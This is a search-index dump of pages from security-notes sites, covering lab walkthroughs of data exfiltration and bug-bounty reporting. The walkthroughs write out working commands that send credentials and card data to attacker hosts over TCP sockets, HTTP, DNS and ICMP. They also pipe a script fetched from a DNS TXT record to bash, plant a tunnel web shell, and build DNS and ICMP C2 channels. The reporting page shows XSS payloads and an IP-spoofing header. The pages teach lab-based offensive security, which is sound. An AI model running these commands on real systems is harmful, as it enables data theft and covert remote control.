[
  {
    "objectID": "23dc69c4ef837db755ade47ae308ec38",
    "u": "https://exfil.tymyrddin.dev/",
    "t": "Gathering edibles ",
    "c": "Gathering edibles  Developing intricate knowledge of plant life and refined technology for gathering edibles in the forest. Non-traditional approaches for copying and transferring data from a compromised to an attacker’s machine. Testlab Exfiltration tools Over common protocols Introduction Exfiltration using TCP socket Exfiltration using FTP/SSH/SCP/SFTP Data exfiltration over HTTP HTTP tunneling Data exfiltration over ICMP ICMP C2 communication Exfiltration over DNS DNS tunneling",
    "cat": "red_out",
    "type": "html"
  },
  {
    "objectID": "f5084ebcea81be4aefc603c49ea63df1",
    "u": "https://exfil.tymyrddin.dev/docs/thm/dns",
    "t": "Exfiltration over DNS ",
    "c": "Exfiltration over DNS  Since DNS is not a transport protocol, many organisations do not regularly monitor the DNS protocol. The DNS protocol is allowed in almost all firewalls in any organisational network, although good organisations will have monitoring in place to detect it afterwards. The fabulous dnscat2 is very easy to get up and running. Some IDS/IDPs are now capable of spotting DNS tunnelling, but often miss data sent via DNS TXT records. Re-useful tools are Uninvited-Guest , and its earlier, more raw version DNSTXT-encoder . There are many use case scenarios, but the typical one is when the firewall blocks and filters all traffic. We can pass data or TCP/UDP packets through a firewall using the DNS protocol, but it is important to ensure that the DNS is allowed and resolving domain names to IP addresses. An attacker registers a domain name, for example, tunnel.com. The attacker sets up tunnel.com’s NS record points to a server that the attacker controls. The malware or the attacker sends sensitive data from a victim machine to a domain name they control—for example, passw0rd.tunnel.com, where passw0rd is the data that needs to be transferred. The DNS request is sent through the local DNS server and is forwarded through the Internet. The attacker’s authoritative DNS (malicious server) receives the DNS request. Finally, the attacker extracts the password from the domain name. DNS Data Exfiltration  Get the required data that needs to be transferred. Encode the file using one of the encoding techniques. Send the encoded characters as subdomain/labels. Consider the limitations of the DNS protocol. Note that we can add as much data as we can to the domain name, but we must keep the whole URL under 255 characters, and each subdomain label ca not exceed 63 characters. If we do exceed these limits, we have to split the data and send more DNS requests. Connect to the new thm attacker machine using ssh from the jump host: thm@jump-box$ ssh thm@attacker.thm.com Capture DNS requests: thm@attacker$ sudo tcpdump -i eth0 udp port 53 -v tcpdump: listening on eth0, link-type RAW (Raw IP), snapshot length 262144 bytes Open a new terminal, ssh jump to victim2 from the jump host: thm@jump-box$ ssh thm@victim2.thm.com Check the content of the creds.txt file: thm@victim2$ cat task9/credit.txt Name: THM-user Address: 1234 Internet, THM Credit Card: 1234-1234-1234-1234 Expire: 05/05/2022 Code: 1337 Encode: thm@victim2$ cat task9/credit.txt | base64 TmFtZTogVEhNLXVzZXIKQWRkcmVzczogMTIzNCBJbnRlcm5ldCwgVEhNCkNyZWRpdCBDYXJkOiAx MjM0LTEyMzQtMTIzNC0xMjM0CkV4cGlyZTogMDUvMDUvMjAyMgpDb2RlOiAxMzM3Cg== Split the content into multiple DNS requests: thm@victim2:~$ cat task9/credit.txt | base64 | tr -d \"\\n\"| fold -w18 | sed -r 's/.*/&.att.tunnel.com/' TmFtZTogVEhNLXVzZX.att.tunnel.com IKQWRkcmVzczogMTIz.att.tunnel.com NCBJbnRlcm5ldCwgVE.att.tunnel.com hNCkNyZWRpdCBDYXJk.att.tunnel.com OiAxMjM0LTEyMzQtMT.att.tunnel.com IzNC0xMjM0CkV4cGly.att.tunnel.com ZTogMDUvMDUvMjAyMg.att.tunnel.com pDb2RlOiAxMzM3Cg==.att.tunnel.com tr -d \"\\n\" - remove newlines. fold -w18 - every 18 characters in a group sed -r 's/.*/&.att.tunnel.com/' - append the name server att.tunnel.com to every group Now split every 18 characters with a dot . and add the name server: thm@victim2:~$ cat task9/credit.txt |base64 | tr -d \"\\n\" | fold -w18 | sed 's/.*/&./' | tr -d \"\\n\" | sed s/$/att.tunnel.com/ TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.comthm@victim2:~$ From the victim2 machine, send the base64 data as a subdomain name via dig taking DNS limitations into account: thm@victim2:~$ cat task9/credit.txt |base64 | tr -d \"\\n\" | fold -w18 | sed 's/.*/&./' | tr -d \"\\n\" | sed s/$/att.tunnel.com/ | awk '{print \"dig +short \" $1}' | bash Open a new terminal, jump to the attacker machine and check results using tcpdump : thm@attacker:~$ sudo tcpdump -i eth0 udp port 53 -v [sudo] password for thm: tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes 16:06:05.923936 IP (tos 0x0, ttl 64, id 47515, offset 0, flags [none], proto UDP (17), length 104) 172.20.0.1.43174 > attacker.domain: 19394% [1au] A? _.pDb2RlOiAxMzM3Cg==.att.tunnel.com. (76) 16:06:05.924355 IP (tos 0x0, ttl 64, id 47516, offset 0, flags [none], proto UDP (17), length 235) 172.20.0.1.36730 > attacker.domain: 33745% [1au] A? TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com. (207) 16:06:05.926140 IP (tos 0x0, ttl 64, id 28057, offset 0, flags [DF], proto UDP (17), length 69) attacker.57010 > 172.20.0.1.domain: 53575+ PTR? 1.0.20.172.in-addr.arpa. (41) 16:06:05.926243 IP (tos 0x0, ttl 64, id 47517, offset 0, flags [DF], proto UDP (17), length 123) 172.20.0.1.domain > attacker.57010: 53575 NXDomain* 0/1/0 (95) Clean and restore the received data: thm@attacker:~$ echo \"TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com.\" | cut -d\".\" -f1-8 | tr -d \".\" | base64 -d Name: THM-user Address: 1234 Internet, THM Credit Card: 1234-1234-1234-1234 Expire: 05/05/2022 Code: 1337 C2 communications over DNS  In victim2, create a script.sh in /tmp : thm@victim2:~$ cd /tmp/ thm@victim2:/tmp$ nano script.sh The code for script.sh : #!/bin/bash ping -c 1 test.thm.com Encode the script: thm@victim2:~$ cat /tmp/script.sh | base64 IyEvYmluL2Jhc2ggCnBpbmcgLWMgMSB0ZXN0LnRobS5jb20K Add it as a TXT DNS record to the tunnel.com domain using the web interface provided: http://MACHINE_IP/ Confirm it was added successfully: thm@victim2:~$ dig +short -t TXT script.tunnel.com \"IyEvYmluL2Jhc2gKcGluZyAtYyAxIHRlc3QudGhtLmNvbQo=\" Run the script (clean using tr and deleting any double quotes \" ): thm@victim2:~$ dig +short -t TXT script.tunnel.com | tr -d \"\\\"\" | base64 -d | bash PING test.thm.com (127.0.0.1) 56(84) bytes of data. 64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.019 ms --- test.thm.com ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.019/0.019/0.019/0.000 ms Get the flag: thm@victim2:~$ dig +short -t TXT flag.tunnel.com | tr -d \"\\\"\" | base64 -d | bash",
    "cat": "red_out",
    "type": "html"
  },
  {
    "objectID": "3c5e004017072a9fa0e4ae196f6cb04c",
    "u": "https://exfil.tymyrddin.dev/docs/thm/icmp-c2",
    "t": "ICMP C2 communication ",
    "c": "ICMP C2 communication  Data exfiltration can also leverage ICMP flows with a C2 server, using the data payload in ICMP-PING packets. The detection of data exfiltration using this method is not easy since it’s hard to tell apart “normal”, legit ICMP traffic from ICMP flows part of an exfiltration attempt. Furthermore, some tools used for endpoint telemetry, such as Sysmon, record TCP/UDP connections but not ICMP flows. Using the ICMPDoor tool. On icmp host: thm@icmp-host:~$ sudo icmpdoor -i eth0 -d 192.168.0.133 On jump host: thm@jump-box:~$ sudo icmp-cnc -i eth1 -d 192.168.0.121 [sudo] password for thm: shell: hostname hostname shell: icmp-host Get the flag: shell: getFlag getFlag shell: [+] Check the flag: /tmp/flag.txt shell: cat /tmp/flag.txt cat /tmp/flag.txt Resources  icyguider/ICMP-TransferTools",
    "cat": "red_out",
    "type": "html"
  },
  {
    "objectID": "570c5c9d4d2ebc76e58e5eb2ea2df755",
    "u": "https://exfil.tymyrddin.dev/docs/thm/https",
    "t": "Data exfiltration over HTTP ",
    "c": "Data exfiltration over HTTP  It is challenging to detect for the blue team if using the POST HTTP method in the data exfiltration (with the GET request, all parameters are registered into the log file). POST requests are never cached POST requests do not remain in the browser history POST requests cannot be bookmarked POST requests have no restrictions on data length To exfiltrate data over the HTTP protocol: An attacker sets up a web server with a data handler ( web.thm.com and a contact.php page as a data handler). A C2 agent or an attacker sends the data (using the curl command). The webserver receives the data and stores it ( contact.php receives the POST request and stores it into /tmp ). The attacker logs into the webserver to have a copy of the received data. The contact.php in /var/www/html on web.thm.com to handle POST requests via a file parameter and storing the received data in the /tmp directory as http.bs64 file name: <?php if (isset($_POST['file'])) { $file = fopen(\"/tmp/http.bs64\",\"w\"); fwrite($file, $_POST['file']); fclose($file); } ?> From the jumphost ssh into the victim1.thm.com machine with the given credentials: thm@jump-box:~$ ssh thm@victim1.thm.com Check the data: thm@victim1:~$ ls -l Send POST data via curl: thm@victim1:~$ curl --data \"file=$(tar zcf - task6 | base64)\" http://web.thm.com/contact.php From the victim1 or jump machine, log in to the webserver, web.thm.com , and check the /tmp directory: thm@victim1:~$ ssh thm@web.thm.com thm@web:~$ ls -l /tmp/ Fix the broken http.bs64 file (broken due to the URL encoding over HTTP). Using the sed command, replace the spaces with + characters to make it a valid base64 string: thm@web:~$ sudo sed -i 's/ /+/g' /tmp/http.bs64 Restore the data: thm@web:~$ cat /tmp/http.bs64 | base64 -d | tar xvfz - HTTPS communications  One of the benefits of HTTPS is encrypting the transmitted data using SSL keys stored on a server. Apply the same technique as used for HTTP on a web server with SSL enabled, all transmitted data will be encrypted.",
    "cat": "red_out",
    "type": "html"
  },
  {
    "objectID": "b17a1ef669afb0ab6aff726ae299d0c9",
    "u": "https://exfil.tymyrddin.dev/docs/thm/ssh",
    "t": "Exfiltration using FTP/SSH/SCP/SFTP ",
    "c": "Exfiltration using FTP/SSH/SCP/SFTP  FTP/SSH/SCP/SFTP might be permitted outbound, or at least most likely will be from some locations as they’re often used as data exchange protocols. Client tools are also readily available on systems without the need to pull down additional binaries. The SSH protocol establishes a secure channel to interact and move data between the client and server. All transmission data is encrypted over the network or the Internet. To transfer data over SSH, use either the Secure Copy Protocol (SCP) or the SSH client. The server in this task has an SSH server enabled, so we can send and receive any exfiltrated data from it. Connect to the victim1 or victim2 machine and check the data to be exfiltrated: ssh thm@<IP jumphost> thm@victim1:~$ cat task5/creds.txt Wrap it up in an archive and send it to the jump host: thm@victim1:$ tar cf - task5/ | ssh thm@jump.thm.com \"cd /tmp/; tar xpf -\" tar cf - task5/ - create an archive. The second dash belongs with the f meaning instead of creating a named file in the filesystem, write the tarred up files onto stdout. ssh thm@jump.thm.com - ssh into the jump host and … \"cd /tmp/; tar xpf - change the directory and unarchive the passed file. Check the received data: thm@jump-box$ cd /tmp/task5/ thm@jump-box:/tmp/task5$ cat creds.txt",
    "cat": "red_out",
    "type": "html"
  },
  {
    "objectID": "dc64cfb45134972fa5e73c209c14acf3",
    "u": "https://exfil.tymyrddin.dev/docs/thm/https-tunnel",
    "t": "HTTP tunneling ",
    "c": "HTTP tunneling  With tunneling over the HTTP protocol technique other protocols are encapsulated and data can be sent back and forth via the HTTP protocol. Use the Neo-reGeorg tool to create a communication channel to access the internal network devices: root@kali:# cd /opt root@kali:# ls firmware-mod-kit kerbrute Neo-reGeorg-master.zip Teeth impacket microsoft nessus xplico root@kali:# unzip Neo-reGeorg-master.zip Archive: Neo-reGeorg-master.zip a9495cabdd59dc1df645742c99c2c7a02702dbf8 creating: Neo-reGeorg-master/ inflating: Neo-reGeorg-master/.gitignore inflating: Neo-reGeorg-master/CHANGELOG-en.md inflating: Neo-reGeorg-master/CHANGELOG.md inflating: Neo-reGeorg-master/LICENSE inflating: Neo-reGeorg-master/README-en.md inflating: Neo-reGeorg-master/README.md inflating: Neo-reGeorg-master/neoreg.py creating: Neo-reGeorg-master/templates/ inflating: Neo-reGeorg-master/templates/NeoreGeorg.java inflating: Neo-reGeorg-master/templates/tunnel.ashx inflating: Neo-reGeorg-master/templates/tunnel.aspx inflating: Neo-reGeorg-master/templates/tunnel.jsp inflating: Neo-reGeorg-master/templates/tunnel.jspx inflating: Neo-reGeorg-master/templates/tunnel.php root@kali:# cd Neo-reGeorg-master root@kali:# ls CHANGELOG-en.md LICENSE README-en.md templates CHANGELOG.md neoreg.py README.md Generate an encrypted client file to upload to the victim web server: root@kali:# python3 neoreg.py generate -k thm \"$$$$$$'' 'M$ '$$$@m :$$$$$$$$$$$$$$''$$$$' '$' 'JZI'$$& $$$$' '$$$ '$$$$ $$$$ J$$$$' m$$$$ $$$$, $$$$@ '$$$$_ Neo-reGeorg '1t$$$$' '$$$$< '$$$$$$$$$$' $$$$ version 3.8.1 '@$$$$' $$$$' '$$$$ '$$$@ 'z$$$$$$ @$$$ r$$$ $$| '$$v c$$ '$$v $$v$$$$$$$$$# $$x$$$$$$$$$twelve$$$@$' @$$$@L ' '<@$$$$$$$$` $$ '$$$ [ Github ] https://github.com/L-codes/Neo-reGeorg [+] Mkdir a directory: neoreg_servers [+] Create neoreg server files: => neoreg_servers/tunnel.php => neoreg_servers/tunnel.ashx => neoreg_servers/tunnel.aspx => neoreg_servers/tunnel.jsp => neoreg_servers/tunnel_compatibility.jsp => neoreg_servers/tunnel.jspx => neoreg_servers/tunnel_compatibility.jspx The command generates encrypted tunneling clients with thm key in the neoreg_servers/ directory. There are many extensions, including for PHP, ASPX, JSP, etc. To access the uploader machine, visit https://LAB_WEB_URL.p.thmlabs.com/uploader : Upload the tunnel.php file via the uploader machine. Use admin as the key to allow upload into uploader.thm.com Use neoreg.py to connect to the client, provide the key to decrypt the tunneling client, and the URL to the tunnel.php just uploaded on the uploader machine. root@kali:# python3 neoreg.py -k thm -u http://10.10.177.27/uploader/files/tunnel.php \"$$$$$$'' 'M$ '$$$@m :$$$$$$$$$$$$$$''$$$$' '$' 'JZI'$$& $$$$' '$$$ '$$$$ $$$$ J$$$$' m$$$$ $$$$, $$$$@ '$$$$_ Neo-reGeorg '1t$$$$' '$$$$< '$$$$$$$$$$' $$$$ version 3.8.1 '@$$$$' $$$$' '$$$$ '$$$@ 'z$$$$$$ @$$$ r$$$ $$| '$$v c$$ '$$v $$v$$$$$$$$$# $$x$$$$$$$$$twelve$$$@$' @$$$@L ' '<@$$$$$$$$` $$ '$$$ [ Github ] https://github.com/L-codes/Neo-reGeorg +------------------------------------------------------------------------+ Log Level set to [ERROR] Starting SOCKS5 server [127.0.0.1:1080] Tunnel at: http://10.10.177.27/uploader/files/tunnel.php +------------------------------------------------------------------------+ Ready to use the tunnel connection as a proxy binds on our local machine, 127.0.0.1, on port 1080: root@kali:# curl --socks5 127.0.0.1:1080 http://172.20.0.120:80 <p><a href=\"/flag\">Get Your Flag!</a></p> root@kali:# curl --socks5 127.0.0.1:1080 http://172.20.0.120:80/flag Done.",
    "cat": "red_out",
    "type": "html"
  },
  {
    "objectID": "a5dd3482ca1b2f9eda972f3275795661",
    "u": "https://exfil.tymyrddin.dev/docs/thm/dns-tunnel",
    "t": "DNS tunneling ",
    "c": "DNS tunneling  This technique is also known as TCP over DNS , where an attacker encapsulates other protocols, such as HTTP requests, over the DNS protocol using the DNS Data Exfiltration technique. DNS Tunneling establishes a communication channel where data is sent and received continuously. Star iodined server on the thm attacker host: thm@attacker$ sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com Opened dns0 Setting IP of dns0 to 10.1.1.1 Setting MTU of dns0 to 1130 Opened IPv4 UDP socket Listening to dns for domain att.tunnel.com Start iodine client on the jump host: thm@jump-box:~$ sudo iodine -P thmpass att.tunnel.com [sudo] password for thm: Opened dns0 Opened IPv4 UDP socket Sending DNS queries for att.tunnel.com to 127.0.0.11 Autodetecting DNS query type (use -T to override). Using DNS type NULL queries Version ok, both using protocol v 0x00000502. You are user #0 Setting IP of dns0 to 10.1.1.2 Setting MTU of dns0 to 1130 Server tunnel IP is 10.1.1.1 Testing raw UDP data to the server (skip with -r) Server is at 172.20.0.200, trying raw login: OK Sending raw traffic directly to 172.20.0.200 Connection setup complete, transmitting data. Detaching from terminal... Start another terminal and jump to the attacker host. SSH over DNS: thm@attacker:~$ sudo ssh thm@10.1.1.2 -4 -f -N -D 1080 [sudo] password for thm: The authenticity of host '10.1.1.2 (10.1.1.2)' can't be established. ECDSA key fingerprint is SHA256:Ks0kFNo7GTsv8uM8bW78FwCCXjvouzDDmATnx1NhbIs. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.1.1.2' (ECDSA) to the list of known hosts. thm@10.1.1.2's password: With this connection to the jump host over the dns0 network, we can access resources: thm@attacker:~$ curl --socks5 127.0.0.1:1080 http://192.168.0.100/demo.php <!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.41 (Ubuntu) Server at 192.168.0.100 Port 80</address> </body></html> Get the flag: thm@attacker:~$ curl --socks5 127.0.0.1:1080 http://192.168.0.100/test.php",
    "cat": "red_out",
    "type": "html"
  },
  {
    "objectID": "34bf8caf50c3cf0ef38d555198873982",
    "u": "https://exfil.tymyrddin.dev/docs/thm/icmp",
    "t": "Data exfiltration over ICMP ",
    "c": "Data exfiltration over ICMP  Using Metasploit auxiliary/server/icmp_exfil : # msfconsole msf6 > use auxiliary/server/icmp_exfil msf6 auxiliary(server/icmp_exfil) > options Module options (auxiliary/server/icmp_exfil): Name Current Setting Required Description ---- --------------- -------- ----------- BPF_FILTER icmp yes BFP format filter to listen for END_TRIGGER ^EOF yes Trigger for end of file FNAME_IN_PACKET true yes Filename presented in first pac ket straight after START_TRIGGE R INTERFACE no The name of the interface RESP_CONT OK yes Data ro resond when continuatio n of data expected RESP_END COMPLETE yes Data to response when EOF recei ved and data saved RESP_START SEND yes Data to respond when initial tr igger matches START_TRIGGER ^BOF yes Trigger for beginning of file Set options: msf6 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src <IP attack machine> BPF_FILTER => icmp and not src <IP attack machine> msf6 auxiliary(server/icmp_exfil) > set INTERFACE tun0 In another terminal, go into the icmp box and start the transmission: thm@jump-box$ ssh thm@icmp.thm.com thm@icmp-host:~# sudo nping --icmp -c 1 <IP attack machine> --data-string \"BOFfile.txt\" Send the data: thm@icmp-host:~# sudo nping --icmp -c 1 <IP attack machine> --data-string \"admin:password\" thm@icmp-host:~# sudo nping --icmp -c 1 <IP attack machine> --data-string \"admin2:password2\" End the transmission: thm@icmp-host:~# sudo nping --icmp -c 1 <IP attack machine> --data-string \"EOF\" Results: msf6 auxiliary(server/icmp_exfil) > run [*] ICMP Listener started on eth0 (ATTACKBOX_IP). Monitoring for trigger packet containing ^BOF [*] Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext) [+] Beginning capture of \"file.txt\" data [*] 30 bytes of data received in total [+] End of File received. Saving \"file.txt\" to loot [+] Incoming file \"file.txt\" saved to loot [+] Loot filename: /path/to/loot/filename.txt",
    "cat": "red_out",
    "type": "html"
  },
  {
    "objectID": "c429e9453ef81ffe9cf8a881cdeed9a9",
    "u": "https://exfil.tymyrddin.dev/docs/thm/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Practice data exfiltration techniques (in the THM Lab environment set up for it) to emulate normal network activities, such as DNS, HTTP, SSH, etc. Why?  Data exfiltration over common protocols is challenging to detect and distinguish between legitimate and malicious traffic. How?  Exfiltration using TCP socket Exfiltration using FTP/SSH/SCP/SFTP Data exfiltration over HTTP HTTP tunneling Data exfiltration over ICMP ICMP C2 communication Exfiltration over DNS DNS tunneling",
    "cat": "red_out",
    "type": "html"
  },
  {
    "objectID": "1ba46602025418fd1bcf5235dd4fb4b0",
    "u": "https://exfil.tymyrddin.dev/docs/thm/tcp",
    "t": "Exfiltration using TCP socket ",
    "c": "Exfiltration using TCP socket  Exfiltration over TCP is unlikely to work, but try raw TCP sockets. Using the TCP socket is one of the data exfiltration techniques that can be used in a non-secured environment where there are no network-based security products (to speak of, as far as we know). This kind of exfiltration is easy to detect because it relies on non-standard protocols. One of the benefits of this technique is that it encodes the data during transmission and makes it harder to examine. ssh into the jump host: ssh thm@<IP jumphost> Use the nc command to receive data on port 8080, store the data in the /tmp/ directory and name it task4-creds.data : thm@jump-box$ nc -lvp 8080 > /tmp/task4-creds.data Move on to the victim machine that contains the data (thm:tryhackme): thm@jump-box$ ssh thm@victim1.thm.com Check the creds.txt file on the victim machine: thm@victim1:~$ cat task4/creds.txt Exfiltrate data over TCP Socket: thm@victim1:$ tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080 tar zcf - create a new archive file, using gzip to compress the selected folder. base64 - encode the new compressed archive. dd conv=ebcdic - create and copy a backup file from it, using EBCDIC encoding. > /dev/tcp/192.168.0.133/8080 - redirect the output to transfer it using the TCP socket on the specified IP and port. Check the received data on the jumphost: thm@jump-box$ nc -lvp 8080 > /tmp/task4-creds.data Listening on [0.0.0.0] (family 0, port 8080) Connection from 192.168.0.101 received! thm@jump-box$ ls -l /tmp/ -rw-r--r-- 1 root root 240 Apr 8 11:37 task4-creds.data Convert the received data back to its original state: thm@jump-box$ cd /tmp/ thm@jump-box:/tmp/$ dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar Unarchive task4-creds.tar : thm@jump-box$ tar xvf task4-creds.tar Confirm the received data: thm@jump-box$ cat task4/creds.txt",
    "cat": "red_out",
    "type": "html"
  },
  {
    "objectID": "36c7f97af1233c5df0bdb92ab2e5ed81",
    "u": "https://bbh.tymyrddin.dev/",
    "t": "Bug bounty hunting ",
    "c": "Bug bounty hunting  Preparing for participation in bug bounty programs , crowd-sourced penetration testing programs that reward finding security bugs and ways to exploit them. A great way to test skills on a variety of targets and get paid in case of finding some security vulnerabilities. Preparation Build a local testlab Essentials Introduction Bug bounty hunting methodology Silent features Writing a report Screencasting PoCs Introduction Installing OBS Studio Installing Shotcut Assets to hunt in Web application hacking Hacking APIs IoT hacking Buffer overflow exploits",
    "cat": "red_out",
    "type": "html"
  },
  {
    "objectID": "2ffd979965928a3e2628523bd4aa94a7",
    "u": "https://bbh.tymyrddin.dev/docs/screencasting/obs",
    "t": "Installing OBS Studio ",
    "c": "Installing OBS Studio  OBS Studio is free and open source video recording and live-streaming software, available for Windows, Mac or Linux. For Linux, it is officially distributed as a Flatpak on Flathub and a PPA for Ubuntu 20.04 and newer. For other installation methods and distros, including unofficial packages, click here . Flatpak  Start her up and go through the wizard. First window  Documentation  OBS Studio’s documentation OBS Wiki Developing plugins for OBS",
    "cat": "red_out",
    "type": "html"
  },
  {
    "objectID": "c911353d80e9c2e51147cb0c3be6dc91",
    "u": "https://bbh.tymyrddin.dev/docs/essentials/silent",
    "t": "Silent features ",
    "c": "Silent features  Clarity  Reports should be clear and should not misguide readers. Be a vulcan, and congruent. Depth  Assume the program owner, developers, security team members reading the report know about the found vulnerability as much as the report describes it. The report should focus deeply on the technical aspects of the vulnerability, so they can do their job well. Respect  This is probably one of the most important features in the report: being respectful to others. Include that respect also in all correspondence. We are authentic and not deceiving them in any way.",
    "cat": "red_out",
    "type": "html"
  },
  {
    "objectID": "ece45e3cf3a986d15a995076a823fcd1",
    "u": "https://bbh.tymyrddin.dev/docs/essentials/methodology",
    "t": "Bug bounty hunting methodology ",
    "c": "Bug bounty hunting methodology  Every bug bounty hunter has a different methodology for hunting vulnerabilities, and it varies from person to person. It takes a while for a researcher to develop their own methodology and lots of experimentation as well. Once you get the hang of it, it is a self-driven process. It could be something like … Scope  The scope is the most important aspect of a bug bounty program because it tells you which assets to test and you don’t want to spend time testing out-of-scope domains. The scope also tells you which are the most recent targets and which are the ones that can be tested to speed up your bounty process. Sometimes a program does not necessarily have the entire infrastructure in its scope and there are just a number of apps or domains that are in the scope of the program. Valid targets are targets that help you quickly test for vulnerabilities in the scope and reduce wasting time. High-level testing of discovered targets  The next thing to do is a quick overview of targets, usually done via automated scanning. This basically tells the researchers whether the targets have been tested before or have they been tested a long time ago. If automated scanning does not reveal vulnerabilities or flaws within a web application or a mobile application, it is likely that the application has been tested by researchers before. Nonetheless, it is still advised to test that application one way or another, as this reveals the application’s flaws in detail. Reviewing all applications  This is a stage where you review all the applications and select the ones based on your skill set. For instance, Google has a number of applications; some of them are coded in Ruby on Rails, some of them are coded in Python. Doing a brief recon on each application of Google will reveal which application is worth testing based on your skill set and level of experience. The method of reviewing all the applications is mostly information gathering and reconnaissance. Fuzzing for errors to expose flaws  Fuzzing is termed as iteration; the fastest way to hack an application is to test all of its input parameters. Fuzzing takes place at the input parameters and is a method of iterating different payloads at different parameters to observe responses. When testing for SQL injection vulnerabilities and cross-site scripting vulnerabilities, fuzzing is the most powerful method to learn about errors and exposure of flaws. It is also used to map an application’s backend structure. Exploiting vulnerabilities to generate POCs  By fuzzing, vulnerabilities can be identified. In other scenarios, vulnerability identification is just one aspect of it. In bug bounty hunting, vulnerabilities have to be exploited constructively to generate strong proof of concepts so that the report is considered in high regard. A well explained the proof of concepts will accelerate the review process. In conventional penetration tests, vulnerability exploitation is not that important, but in bug bounty hunting, the stronger the proof of concept, the better the reward.",
    "cat": "red_out",
    "type": "html"
  },
  {
    "objectID": "e02fa40a4ac2f85aafe767ea889a7957",
    "u": "https://bbh.tymyrddin.dev/docs/essentials/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Methodological, clear and useful communication and reporting. Why?  Explaining vulnerabilities to developers and security teams. Support others reproducing and fixing the exploit. Fix issues faster (so the less likely malicious hackers can exploit the vulnerability). How?  Bug bounty hunting methodology Silent features Writing a report",
    "cat": "red_out",
    "type": "html"
  },
  {
    "objectID": "3f50876f6588008c2999c140412ab9a2",
    "u": "https://bbh.tymyrddin.dev/docs/essentials/report",
    "t": "Writing a report ",
    "c": "Writing a report  Report formats are not universal, and it may vary from platform to platform, person to person, and case to case. Below are sections that can be included for reporting. Descriptive title  The first part of a great vulnerability report is always a descriptive title. Try for a title that sums up the issue in one sentence. It is to allow developers and security team to immediately get an idea of what the vulnerability is, where it occurred, and its potential severity. Client-side prototype pollution via flawed sanitization in xyz Union-based SQL injection in xyz portal Hostile subdomain takeover in admin.xyz.com Account takeover using password reset token Host validation bypass via connection state attack Description or summary  The second part of the report is a description or summary. It must be precise, clear, and to the point. People want to have direct engagement with any text, so they do not have to read much and can pick out the salient points easily. The description should not be something generic; it should be environmental and scenario-specific. The https://example.com/change_password endpoint takes two POST body parameters: user_id and new_password . A POST request to this endpoint would change the password of user user_id to new_password . This endpoint is not validating the user_id parameter, and as a result, any user can change anyone else’s password by manipulating the user_id parameter. Proof of Concept  Without the proof of concept replication steps, there is no way that a developer or security team can recreate the scenario, so it is important to list down the steps exactly which can be used to replicate the vulnerability. Some requested report formats will ask for “Clear Steps to Reproduce” AND “PoC”. In this case the PoC can be a video, screenshots, photos documenting an exploit, or a code file (for example, an HTML file with a CSRF payload embedded). When writing “Clear Steps to Reproduce”, always treat developer, security team members, or customer as a newbie when writing the proof of concept. This is not unwarranted “talking down”. List down all the steps in a detailed and hierarchical manner. Having simple, easy-to-follow, step-by-step instructions will help those triaging the issue to confirm its validity at the earliest opportunity. Example PoC: Manipulating the WebSocket handshake  Click “Live chat” and send a chat message. In Burp Proxy, go to the WebSockets history tab, and observe that the chat message has been sent via a WebSocket message. Right-click on the message and select “Send to Repeater”. Edit and resend the message containing a basic XSS payload, such as: <img src=1 onerror='alert(1)'> Observe that the attack has been blocked, and that your WebSocket connection has been terminated. Click “Reconnect”, and observe that the connection attempt fails because your IP address has been banned. Add the following header to the handshake request to spoof your IP address: X-Forwarded-For: 1.1.1.1 Click “Connect” to successfully reconnect the WebSocket. Send a WebSocket message containing an obfuscated XSS payload, such as: <img src=1 oNeRrOr=alert`1`> Severity assessment  The report should also include an honest assessment of the bug’s severity to help developers or security team in their prioritisation which vulnerabilities to fix first. This depends on the scoring system the client or customer is using. For example, Bugcrowd’s rating system takes into account the type of vulnerability and the affected functionality , and HackerOne provides a severity calculator based on the CVSS scale . List the severity in a single line, or if an impact statement is used, a single sentence. Severity of the issue: High Exploitability  Illustrate a plausible scenario in which the vulnerability could be exploited. To exploit this vulnerability, an attacker would have to create an exploit from a well-known template; then would need to convince the administrator into visiting the page with the exploit by social engineering techniques, potentially giving the attacker access to the administrator’s account and all associated privileges and resources. Impact  Show developers or the security team how likely it is that this vulnerability can pose a significant threat and describe its possible impact. This can help them escalate this to higher levels if needs be. This is not the same as a severity assessment. A severity assessment describes the severity of the consequences of an attacker exploiting the vulnerability, whereas an impact statement explains what those consequences would actually look like. The attacker could disable account notifications, enable 2FA to lock them out, and transfer their data to an arbitrary address. Remediation  It is also important to suggest fixes and patches for a vulnerability found. Demonstrate there are solutions for the flaws. This statement should never be about generically sanitizing the inputs. It should provide them with references and probable methods to reach the solution. Sometimes, the development team doesn’t know how to warrant a fix to a vulnerability, and giving them a great statement of a suggested fix, it will be highly appreciated. The application should validate the user’s user_id parameter within the change password request to ensure that the user is authorised to make account modifications. Unauthorised requests should be rejected and logged by the application. Validate  Always validate the report. Go through your report one last time to make sure that there are no technical errors, or anything that might prevent the security team from understanding 